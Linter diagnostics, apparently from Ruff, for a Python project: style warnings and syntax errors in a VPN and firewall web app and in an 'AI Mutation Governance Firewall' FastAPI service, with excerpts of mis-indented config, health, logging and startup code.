   --> external\Thirstys-Waterfall\web\app.py:344:29
    |
342 |             return {"success": False, "error": str(e), "real": True}
343 |
344 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
345 |         """Get comprehensive system status including all subsystems."""
346 |         try:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:371:33
    |
369 |             return {"available": False, "error": str(e)}
370 |
371 |     def get_vpn_status(self) -> Dict[str, Any]:
    |                                 ^^^^
372 |         """Get real VPN status from the VPN manager."""
373 |         try:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:392:30
    |
390 |             return {"success": False, "error": str(e), "real": True}
391 |
392 |     def vpn_connect(self) -> Dict[str, Any]:
    |                              ^^^^
393 |         """Connect the VPN."""
394 |         try:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:426:33
    |
424 |             return {"success": False, "error": str(e), "real": True}
425 |
426 |     def vpn_disconnect(self) -> Dict[str, Any]:
    |                                 ^^^^
427 |         """Disconnect the VPN."""
428 |         try:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:457:39
    |
455 |             return {"success": False, "error": str(e), "real": True}
456 |
457 |     def get_firewalls_status(self) -> Dict[str, Any]:
    |                                       ^^^^
458 |         """Get real status of all 8 firewalls."""
459 |         try:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:484:35
    |
482 |             return {"success": False, "error": str(e), "real": True}
483 |
484 |     def get_browser_tabs(self) -> Dict[str, Any]:
    |                                   ^^^^
485 |         """Get browser tabs (placeholder for real implementation)."""
486 |         try:
    |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "AI Mutation Governance Firewall"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> governance\ai-mutation-governance-firewall\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> governance\ai-mutation-governance-firewall\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> governance\ai-mutation-governance-firewall\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 250
31 |     RATE_LIMIT_BURST: int = 500
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> governance\ai-mutation-governance-firewall\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> governance\ai-mutation-governance-firewall\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> governance\ai-mutation-governance-firewall\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> governance\ai-mutation-governance-firewall\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> governance\ai-mutation-governance-firewall\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> governance\ai-mutation-governance-firewall\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> governance\ai-mutation-governance-firewall\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> governance\ai-mutation-governance-firewall\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> governance\ai-mutation-governance-firewall\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("ai_mutation_governance_firewall")
   | ^
   |

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting AI Mutation Governance Firewall service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> governance\ai-mutation-governance-firewall\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> governance\ai-mutation-governance-firewall\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> governance\ai-mutation-governance-firewall\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down AI Mutation Governance Firewall service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down AI Mutation Governance Firewall service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> governance\ai-mutation-governance-firewall\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="AI Mutation Governance Firewall",
86 |     description="build a runtime AI mutation gate.
   |

invalid-syntax: missing closing quote in string literal
  --> governance\ai-mutation-governance-firewall\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="AI Mutation Governance Firewall",
86 |     description="build a runtime AI mutation gate.
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
87 | Microservices:
88 | Model change proposal intake
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:87:1
   |
85 |     title="AI Mutation Governance Firewall",
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
   | ^^^^^^^^^^^^^
88 | Model change proposal intake
89 | Deterministic shadow simulation
   |

invalid-syntax: Expected `,`, found `:`
  --> governance\ai-mutation-governance-firewall\main.py:87:14
   |
85 |     title="AI Mutation Governance Firewall",
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
   |              ^
88 | Model change proposal intake
89 | Deterministic shadow simulation
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> governance\ai-mutation-governance-firewall\main.py:88:1
   |
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
88 | Model change proposal intake
   | ^^^^^
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:88:7
   |
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
88 | Model change proposal intake
   |       ^^^^^^
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:88:14
   |
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
88 | Model change proposal intake
   |              ^^^^^^^^
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:88:23
   |
86 |     description="build a runtime AI mutation gate.
87 | Microservices:
88 | Model change proposal intake
   |                       ^^^^^^
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:89:1
   |
87 | Microservices:
88 | Model change proposal intake
89 | Deterministic shadow simulation
   | ^^^^^^^^^^^^^
90 | Quorum validation engine
91 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:89:15
   |
87 | Microservices:
88 | Model change proposal intake
89 | Deterministic shadow simulation
   |               ^^^^^^
90 | Quorum validation engine
91 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:89:22
   |
87 | Microservices:
88 | Model change proposal intake
89 | Deterministic shadow simulation
   |                      ^^^^^^^^^^
90 | Quorum validation engine
91 | Rollback + snapshot manager
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:90:1
   |
88 | Model change proposal intake
89 | Deterministic shadow simulation
90 | Quorum validation engine
   | ^^^^^^
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:90:8
   |
88 | Model change proposal intake
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |        ^^^^^^^^^^
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:90:19
   |
88 | Model change proposal intake
89 | Deterministic shadow simulation
90 | Quorum validation engine
   |                   ^^^^^^
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:91:1
   |
89 | Deterministic shadow simulation
90 | Quorum validation engine
91 | Rollback + snapshot manager
   | ^^^^^^^^
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:91:21
   |
89 | Deterministic shadow simulation
90 | Quorum validation engine
91 | Rollback + snapshot manager
   |                     ^^^^^^^
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:92:1
   |
90 | Quorum validation engine
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   | ^^^^^^^^^^^^^
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:92:15
   |
90 | Quorum validation engine
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |               ^^^^^^
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:92:22
   |
90 | Quorum validation engine
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
   |                      ^^^^^^^^^^^^
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:93:1
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   | ^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:93:6
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |      ^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found `:`
  --> governance\ai-mutation-governance-firewall\main.py:93:13
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |             ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Got unexpected token ΓÇ£
  --> governance\ai-mutation-governance-firewall\main.py:93:15
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |               ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> governance\ai-mutation-governance-firewall\main.py:93:16
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:93:18
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                  ^^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:93:29
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                             ^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:93:39
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> governance\ai-mutation-governance-firewall\main.py:93:39
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Unparenthesized generator expression cannot be used here
  --> governance\ai-mutation-governance-firewall\main.py:93:39
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `in`, found name
  --> governance\ai-mutation-governance-firewall\main.py:93:57
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                         ^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Got unexpected token ΓÇ¥
  --> governance\ai-mutation-governance-firewall\main.py:93:67
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                                   ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found Unknown
  --> governance\ai-mutation-governance-firewall\main.py:93:67
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                                   ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> governance\ai-mutation-governance-firewall\main.py:94:1
   |
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   | ^^^^^^^^^^^^^
95 | DARPA, defense, sovereign AI labs would care.",
96 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:94:15
   |
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |               ^^^
95 | DARPA, defense, sovereign AI labs would care.",
96 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:94:19
   |
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |                   ^^^^^
95 | DARPA, defense, sovereign AI labs would care.",
96 |     version="1.0.0",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> governance\ai-mutation-governance-firewall\main.py:95:8
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |        ^^^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> governance\ai-mutation-governance-firewall\main.py:95:17
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                 ^^^^^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:95:27
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                           ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:95:30
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                              ^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:95:35
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                   ^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:95:41
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                         ^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> governance\ai-mutation-governance-firewall\main.py:95:41
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                         ^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: missing closing quote in string literal
  --> governance\ai-mutation-governance-firewall\main.py:95:46
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                              ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found string
  --> governance\ai-mutation-governance-firewall\main.py:95:46
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
